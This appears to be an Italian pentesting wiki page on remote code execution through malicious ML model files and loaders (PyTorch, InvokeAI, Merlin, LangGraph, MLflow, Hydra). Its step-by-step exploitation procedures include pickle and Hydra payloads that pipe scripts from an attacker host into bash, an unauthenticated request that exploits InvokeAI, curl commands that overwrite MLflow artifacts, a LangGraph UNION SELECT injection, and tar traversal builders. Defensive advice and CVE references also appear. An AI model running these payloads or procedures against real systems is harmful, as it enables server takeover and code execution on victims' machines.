# RCE tramite modelli

{{#include ../banners/hacktricks-training.md}}

## Caricamento di modelli per ottenere RCE

I modelli di Machine Learning vengono solitamente condivisi in diversi formati, come ONNX, TensorFlow, PyTorch, ecc. Questi modelli possono essere caricati sui computer degli sviluppatori o nei sistemi di produzione per essere utilizzati. Di solito i modelli non dovrebbero contenere codice malevolo, ma in alcuni casi possono essere usati per eseguire codice arbitrario sul sistema, come funzionalità prevista o a causa di una vulnerabilità nella libreria di caricamento dei modelli.

La seguente tabella elenca vulnerabilità rappresentative di questa categoria:

| **Framework / Strumento**        | **Vulnerabilità (CVE, se disponibile)**                                                    | **Vettore RCE**                                                                                                                           | **Riferimenti**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Deserializzazione non sicura in* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malevolo nel checkpoint del modello consente l'esecuzione di codice (eludendo la protezione `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + download di un modello malevolo causano l'esecuzione di codice; RCE tramite deserializzazione Java nell'API di gestione                                        | |
| **NVIDIA Merlin Transformers4Rec** | Deserializzazione non sicura del checkpoint tramite `torch.load` **(CVE-2025-23298)**                                           | Un checkpoint non attendibile attiva un reducer pickle durante `load_model_trainer_states_from_checkpoint` → esecuzione di codice nel worker ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + hook di estensione MessagePack non sicuro **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | La chiave `filter` controllata dall'utente inietta sintassi SQL/JSON-path, `UNION SELECT` fabbrica una riga di checkpoint falsa, quindi la deserializzazione `msgpack` importa e richiama codice Python scelto dall'attaccante | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML non sicuro) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Il caricamento di un modello da YAML usa `yaml.unsafe_load` (esecuzione di codice) <br> Il caricamento di un modello con un layer **Lambda** esegue codice Python arbitrario          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (parsing TFLite)                                                                                          | Un modello `.tflite` creato appositamente attiva un integer overflow → corruzione dell'heap (potenziale RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Il caricamento di un modello tramite `joblib.load` esegue un pickle con il payload `__reduce__` dell'attaccante                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` non sicuro) *contestata*                                                                              | Il comportamento predefinito di `numpy.load` consentiva array di oggetti pickle: un `.npy/.npz` malevolo attiva l'esecuzione di codice                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (directory traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Il percorso dei pesi esterni del modello ONNX può uscire dalla directory (lettura di file arbitrari) <br> Un archivio tar con un modello ONNX malevolo può sovrascrivere file arbitrari (causando RCE) | |
| ONNX Runtime (rischio di progettazione)  | *(Nessuna CVE)* custom ops ONNX / flusso di controllo                                                                                    | Un modello con un operatore personalizzato richiede il caricamento di codice nativo dell'attaccante; grafi di modelli complessi sfruttano la logica per eseguire calcoli non previsti   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | L'uso dell'API di caricamento dei modelli con `--model-control` abilitato consente il path traversal relativo per scrivere file (ad es. sovrascrivere `.bashrc` per ottenere RCE)    | |
| **GGML (formato GGUF)**      | **CVE-2024-25664 … 25668** (diversi heap overflow)                                                                         | Un file modello GGUF malformato causa heap buffer overflow nel parser, consentendo l'esecuzione di codice arbitrario sul sistema della vittima                     | |
| **Keras (formati precedenti)**   | *(Nessuna nuova CVE)* Modello Keras H5 legacy                                                                                         | Il codice del layer Lambda in un modello HDF5 (`.h5`) malevolo viene comunque eseguito al caricamento (la safe_mode di Keras non copre il vecchio formato: “downgrade attack”) | |
| **Altri** (generale)        | *Difetto di progettazione* – serializzazione Pickle                                                                                         | Molti strumenti ML (ad es. formati di modelli basati su pickle, `pickle.load` di Python) eseguono codice arbitrario incorporato nei file dei modelli, se non vengono adottate misure di mitigazione | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadati non attendibili passati a `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | I metadati/la configurazione del modello controllati dall'attaccante impostano `_target_` su un callable arbitrario (ad es. `builtins.exec`) → eseguito durante il caricamento, anche con formati “sicuri” (`.safetensors`, `.nemo`, `config.json` del repository) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Inoltre, alcuni modelli basati su pickle di Python, come quelli usati da [PyTorch](https://github.com/pytorch/pytorch/security), possono essere utilizzati per eseguire codice arbitrario sul sistema se non vengono caricati con `weights_only=True`. Pertanto, qualsiasi modello basato su pickle potrebbe essere particolarmente vulnerabile a questo tipo di attacchi, anche se non è elencato nella tabella sopra.

### Metadati Hydra → RCE (funziona anche con safetensors)

`hydra.utils.instantiate()` importa e richiama qualsiasi `_target_` puntato da un percorso con punti in un oggetto di configurazione/metadati. Quando librerie come Hugging Face Transformers passano **metadati di modelli non attendibili** a `instantiate()`, un attaccante può fornire un callable e gli argomenti che verranno eseguiti immediatamente durante il caricamento del modello (senza bisogno di pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Esempio di payload (funziona in `model_config.yaml` di `.nemo`, in `config.json` del repository o in `__metadata__` all'interno di `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Punti chiave:
- Attivato prima dell'inizializzazione del modello in `restore_from/from_pretrained` di NeMo, nei coder HuggingFace di uni2TS e nei loader di FlexTok.
- La block-list di stringhe di Hydra è aggirabile tramite percorsi di import alternativi (ad es. `enum.bltns.eval`) o nomi risolti dall'applicazione (ad es. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok analizza inoltre metadati convertiti in stringhe con `ast.literal_eval`, consentendo un DoS (esaurimento di CPU/memoria) prima della chiamata a Hydra.

### 🆕  RCE in InvokeAI tramite `torch.load` (CVE-2024-12029)

`InvokeAI` è una popolare interfaccia web open source per Stable-Diffusion. Le versioni **5.3.1 – 5.4.2** espongono l'endpoint REST `/api/v2/models/install`, che consente agli utenti di scaricare e caricare modelli da URL arbitrari.<sup>[[1]](#references)</sup>

Internamente, l'endpoint alla fine chiama:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Quando il file fornito è un **checkpoint PyTorch (`*.ckpt`)**, `torch.load` esegue una **deserializzazione pickle**. Poiché il contenuto proviene direttamente dall'URL controllato dall'utente, un attaccante può incorporare nel checkpoint un oggetto malevolo con un metodo `__reduce__` personalizzato; il metodo viene eseguito **durante la deserializzazione**, causando **remote code execution (RCE)** sul server InvokeAI.

Alla vulnerabilità è stato assegnato **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Procedura di sfruttamento

1. Crea un checkpoint malevolo:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Ospita `payload.ckpt` su un server HTTP che controlli (ad es. `http://ATTACKER/payload.ckpt`).
3. Attiva l'endpoint vulnerabile (non è richiesta autenticazione):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Quando InvokeAI scarica il file, chiama `torch.load()` → il gadget `os.system` viene eseguito e l'attaccante ottiene l'esecuzione di codice nel contesto del processo InvokeAI.

Exploit già pronto: il modulo **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizza l'intero flusso.<sup>[[3]](#references)</sup>

#### Condizioni

•  InvokeAI 5.3.1-5.4.2 (flag di scansione impostato su **false** per impostazione predefinita)
•  `/api/v2/models/install` raggiungibile dall'attaccante
•  Il processo dispone dei permessi per eseguire comandi shell

#### Mitigazioni

* Aggiorna a **InvokeAI ≥ 5.4.3**: la patch imposta `scan=True` per impostazione predefinita ed esegue la scansione antimalware prima della deserializzazione.<sup>[[2]](#references)</sup>
* Quando carichi checkpoint a livello di codice, usa `torch.load(file, weights_only=True)` o il nuovo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Applica allow-list / firme alle sorgenti dei modelli ed esegui il servizio con privilegi minimi.

> ⚠️ Ricorda che **qualsiasi** formato basato su pickle di Python (inclusi molti file `.pt`, `.pkl`, `.ckpt`, `.pth`) è intrinsecamente pericoloso da deserializzare se proviene da sorgenti non attendibili.

---

Esempio di mitigazione ad hoc se devi mantenere versioni meno recenti di InvokeAI in esecuzione dietro un reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE tramite `torch.load` non sicuro (CVE-2025-23298)

Transformers4Rec di NVIDIA (parte di Merlin) esponeva un loader di checkpoint non sicuro che chiamava direttamente `torch.load()` su percorsi forniti dall’utente. Poiché `torch.load` si basa su Python `pickle`, un checkpoint controllato dall’attaccante può eseguire codice arbitrario tramite un reducer durante la deserializzazione.<sup>[[5]](#references)</sup>

Percorso vulnerabile (prima della correzione): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Perché questo porta a RCE: in Python pickle, un oggetto può definire un reducer (`__reduce__`/`__setstate__`) che restituisce una funzione chiamabile e i relativi argomenti. La funzione viene eseguita durante l’unpickling. Se un oggetto di questo tipo è presente in un checkpoint, viene eseguito prima ancora che vengano usati i pesi.

Esempio minimo di checkpoint malevolo:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Vettori di delivery e raggio d'impatto:
- Checkpoint/modelli trojanizzati condivisi tramite repo, bucket o registry di artifact
- Pipeline automatizzate di resume/deploy che caricano automaticamente i checkpoint
- L'esecuzione avviene nei worker di training/inference, spesso con privilegi elevati (ad es. root nei container)

Fix: il commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ha sostituito la chiamata diretta a `torch.load()` con un deserializer ristretto e basato su allow-list, implementato in `transformers4rec/utils/serialization.py`. Il nuovo loader convalida i tipi e i campi e impedisce l'invocazione di callable arbitrari durante il caricamento.<sup>[[7]](#references)</sup>

Indicazioni difensive specifiche per i checkpoint PyTorch:
- Non eseguire l'unpickle di dati non attendibili. Quando possibile, preferisci formati non eseguibili come [Safetensors](https://huggingface.co/docs/safetensors/index) o ONNX.
- Se devi usare la serializzazione PyTorch, assicurati che `weights_only=True` (supportato nelle versioni più recenti di PyTorch) oppure usa un unpickler personalizzato basato su allow-list, simile a quello della patch di Transformers4Rec.<sup>[[4]](#references)</sup>
- Verifica la provenienza e le firme dei modelli e isola in sandbox la deserializzazione (seccomp/AppArmor; utente non-root; filesystem limitato e nessun traffico di rete in uscita).
- Monitora la creazione di processi child inattesi da parte dei servizi ML al caricamento dei checkpoint; traccia l'uso di `torch.load()`/`pickle`.

Riferimenti a POC e versioni vulnerabili/corrette:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Loader vulnerabile prima della patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC di checkpoint malevolo: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader dopo la patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Esempio – creazione di un modello PyTorch malevolo

- Crea il modello:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Carica il modello:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserializzazione Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD di Tencent espone un endpoint `resnet` che deserializza dati controllati dall’utente. ZDI ha confermato che un attaccante remoto può indurre una vittima a caricare una pagina/un file dannoso e a inviare a tale endpoint un blob serializzato appositamente creato, attivando la deserializzazione con privilegi `root` e causando una compromissione completa.

Il flusso di exploit ricalca i tipici abusi di pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Qualsiasi gadget raggiungibile durante la deserializzazione (costruttori, `__setstate__`, callback dei framework, ecc.) può essere weaponized allo stesso modo, indipendentemente dal fatto che il trasporto fosse HTTP, WebSocket o un file depositato in una directory monitorata.



### LangGraph checkpointer SQLi → MessagePack RCE

Questa catena di attacco è interessante perché l'attaccante **non deve caricare un file di modello malevolo**. L'applicazione espone invece un'**API di persistenza per agenti AI** (`get_state_history(..., filter=...)`) e l'input dell'utente raggiunge il query builder del checkpointer.

#### 1. SQLi strutturale nei filtri dei metadati

Un pattern vulnerabile con SQLite era simile a questo:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Il valore viene associato in seguito, ma `query_key` viene concatenato nella **stringa del percorso JSON**, quindi un `'` all’interno della chiave del dizionario esce da `'$.{query_key}'` e inietta SQL. La stessa lezione vale per **percorsi JSON, identificatori, operatori, `LIMIT` e campi TTL**: i placeholder proteggono solo i valori, non la sintassi strutturale della query.

#### 2. `UNION SELECT` può raggiungere sink a valle, non solo sottrarre dati

La query restituisce `type` e i byte di `checkpoint` serializzati, che vengono poi usati come segue:

```python
self.serde.loads_typed((type, checkpoint))
```

Ciò significa che una SQLi nella clausola `WHERE` può iniettare una **riga di risultato falsa**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Se in seguito il codice analizza, deserializza, scrive o esegue una colonna selezionata, associa quelle colonne ai rispettivi sink. In questo caso, la riga falsa trasforma la SQLi in **deserializzazione controllata dall'attaccante**.

#### 3. Gli hook di estensione non sicuri di MessagePack equivalgono a gadget di codice

Il percorso `msgpack` di LangGraph usava un hook di estensione personalizzato che spacchettava una tupla annidata ed eseguiva:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Quindi, un oggetto di estensione MessagePack che codifica qualcosa di equivalente a `("os", "system", "id > /tmp/pwned")` importa `os`, risolve `system` ed esegue il comando. Quando esaminate i framework AI, controllate i **reviver personalizzati di MessagePack/JSON/pickle** per individuare import dinamici, reflection o dispatch arbitrario di callable.

#### 4. Schema pratico di audit per i framework agent

Esaminate qualsiasi input controllato dall'utente che raggiunga:
- API per elencare cronologia dello stato / memoria / replay / checkpoint
- builder di filtri strutturati che generano frammenti di query SQL o Redis
- deserializzatori personalizzati (`pickle`, `msgpack`, hook per oggetti `json`, costruttori YAML)
- percorsi di ripristino che si fidano delle righe restituite dal livello di persistenza

Questa specifica catena ha interessato le distribuzioni self-hosted di LangGraph che usavano checkpointer **SQLite** o **Redis** quando utenti non attendibili potevano controllare `filter`. Le versioni corrette indicate nella divulgazione erano `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` e `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Sovrascrittura di artifact PyFunc di MLflow per ottenere RCE tramite pickle

Un PyFunc di MLflow creato a partire da un `PythonModel` può archiviare l'oggetto serializzato come `python_model.pkl`. I metadati del modello indicano `mlflow.pyfunc.model` come loader e l'implementazione di MLflow usa questo nome file per il modello Python salvato. Di conseguenza, l'accesso in scrittura all'artifact store può portare all'esecuzione di codice in un'altra applicazione che carica successivamente il modello.<sup>[[17]](#references)[[18]](#references)</sup>

La catena utile è **permesso di scrittura sull'artifact → sostituzione del pickle → ricaricamento da parte di un consumer di inferenza**. Per un esperimento che usa una root `mlflow-artifacts:/...` proxy, enumerate il percorso dell'artifact di esperimento, run e modello. Il tracking server espone `GET` e `PUT` su `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Un reducer minimo può eseguire un comando non appena il consumer deserializza l’artefatto con `unpickle`. Generare il payload con la versione di Python dichiarata in `MLmodel` evita problemi di compatibilità.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Attiva l’operazione che **carica il modello esistente**, ad esempio una previsione, uno scoring o un deployment. Non eseguire prima il retraining, perché potrebbe sostituire l’artefatto malevolo con un modello nuovo. Un errore dell’applicazione non esclude lo sfruttamento: il reducer restituisce il codice di uscita intero del comando invece di un modello utilizzabile. Inizia con un effetto collaterale osservabile, come ICMP o una callback HTTP, poi sostituiscilo con il payload finale.<sup>[[20]](#references)</sup>

Durante la valutazione, distingui il permesso di creare un run dal permesso di sovrascrivere gli artefatti appartenenti a un altro run. Esamina l’autenticazione e i permessi di aggiornamento per run, controlla le modifiche inattese a `python_model.pkl` e considera la provenienza e l’integrità del modello parte del perimetro di esecuzione. Il codice attuale di MLflow supporta anche l’impostazione di `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` e raccomanda gli artefatti models-from-code invece di caricare dati cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

## Modelli per Path Traversal

Come spiegato in [**questo post del blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la maggior parte dei formati di modello usati dai diversi framework AI si basa su archivi, di solito `.zip`. Pertanto, potrebbe essere possibile abusare di questi formati per eseguire attacchi di Path Traversal e leggere file arbitrari dal sistema in cui viene caricato il modello.<sup>[[16]](#references)</sup>

Ad esempio, con il codice seguente puoi creare un modello che, al caricamento, creerà un file nella directory `/tmp`:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Oppure, con il seguente codice puoi creare un modello che crea un symlink alla directory `/tmp` al momento del caricamento:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Approfondimento: deserializzazione di Keras .keras e ricerca di gadget

Per una guida specifica sugli interni di .keras, l’RCE tramite Lambda layer, il problema dell’import arbitrario nelle versioni ≤ 3.8 e la ricerca di gadget nell’allowlist dopo la correzione, consulta:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blog di OffSec – "CVE-2024-12029 – Deserializzazione di dati non attendibili in InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit della patch di InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Documentazione del modulo Metasploit di Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – considerazioni sulla sicurezza di torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog di ZDI – CVE-2025-23298: ottenere l’esecuzione di codice remoto in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Avviso di ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit della patch di Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Loader vulnerabile prima della patch (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC di checkpoint malevolo (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader dopo la patch (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Transformers di Hugging Face](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Esecuzione di codice remoto con formati e librerie AI/ML moderni](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Documentazione di Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit della block-list di Hydra (avviso sull’RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Da SQLi a RCE: sfruttare il checkpointer di LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Trasformare i bug di archive slip in bounty AI/ML di alto valore](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Avviso di Snyk e proof of concept PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Sorgente di MLflow – `model.py` di PyFunc](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [API REST di MLflow – endpoint per il download e il caricamento degli artifact](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
